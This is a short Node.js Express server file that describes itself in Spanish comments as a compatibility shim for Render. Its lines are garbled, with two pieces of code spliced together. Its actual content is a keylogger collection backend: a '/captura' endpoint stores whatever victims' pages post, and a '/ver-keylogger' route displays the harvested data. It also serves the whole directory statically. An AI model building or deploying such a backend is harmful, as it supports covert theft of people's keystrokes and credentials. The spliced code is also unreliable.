// Archivo de compatibilidad para Renderconst express = require('express');

// Redirige al servidor en la nueva estructuraconst bodyParser = require('body-parser');

const fs = require('fs');

console.log('🔄 Iniciando servidor desde estructura actualizada...');const app = express();

const PORT = process.env.PORT || 3000;

// Requiere el servidor desde la nueva ubicación

require('./src/server.js');app.use(bodyParser.json());

app.post('/captura', (req, res) => {
  fs.appendFileSync('datos.txt', JSON.stringify(req.body) + '\n');
  res.json({ ok: true });
});

app.get('/', (req, res) => {
  res.send('¡Backend de prueba activo!');
});

app.listen(PORT, () => {
  console.log(`Servidor escuchando en el puerto ${PORT}`);
});

app.use(express.static(__dirname));

app.get('/ver-keylogger', (req, res) => {
  const fs = require('fs');
  fs.readFile('datos.txt', 'utf8', (err, data) => {
    if (err) return res.status(500).send('Error al leer datos');
    res.send(`<pre>${data}</pre>`);
  });
});